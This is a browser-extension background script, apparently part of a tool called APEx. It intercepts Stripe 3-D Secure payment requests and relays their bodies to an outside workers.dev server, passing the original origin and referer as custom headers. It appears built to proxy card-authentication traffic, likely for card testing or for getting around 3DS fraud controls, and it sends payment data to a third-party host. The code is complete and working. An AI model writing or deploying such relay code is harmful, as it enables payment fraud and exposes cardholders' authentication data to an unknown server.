// APEx 3DS Relay Background Handler
(function() {
  var RELAY_ENDPOINT_DEFAULT = "https://db-auth-svc-v2.testdeep.workers.dev/relay/3ds2";

  async function getRelayEndpoint() {
    return new Promise(function(resolve) {
      chrome.storage.local.get(["APEx_3ds_relay_url", "APEx_settings"], function(result) {
        var customUrl = result.APEx_3ds_relay_url;
        if (customUrl && typeof customUrl === "string" && customUrl.trim()) {
          resolve(customUrl.trim().replace(/\/+$/, "") + "/relay/3ds2");
          return;
        }
        var settings = result.APEx_settings || {};
        if (settings.relayServerUrl && typeof settings.relayServerUrl === "string") {
          resolve(settings.relayServerUrl.trim().replace(/\/+$/, "") + "/relay/3ds2");
          return;
        }
        resolve(RELAY_ENDPOINT_DEFAULT);
      });
    });
  }

  if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.onMessage) {
    chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
      if (!request || request.type !== "APEx_3DS_RELAY") return false;

      (async function() {
        try {
          var url = request.url;
          var body = request.body;
          var origin = request.origin;
          var referer = request.referer;

          if (!url || !url.includes("stripe.com")) {
            sendResponse({ error: "Invalid target URL" });
            return;
          }

          var relayUrl = await getRelayEndpoint();
          var headers = { "Content-Type": "application/x-www-form-urlencoded" };
          if (origin && typeof origin === "string") headers["X-Original-Origin"] = origin;
          if (referer && typeof referer === "string") headers["X-Original-Referer"] = referer;

          var response = await fetch(relayUrl, { method: "POST", headers: headers, body: body });
          var responseText = await response.text();
          var responseHeaders = {};
          response.headers.forEach(function(value, key) { responseHeaders[key.toLowerCase()] = value; });

          sendResponse({
            status: response.status,
            statusText: response.statusText,
            headers: responseHeaders,
            body: responseText
          });
        } catch (error) {
          sendResponse({ error: error && error.message || "Relay server connection failed" });
        }
      })();

      return true;
    });
  }
})();
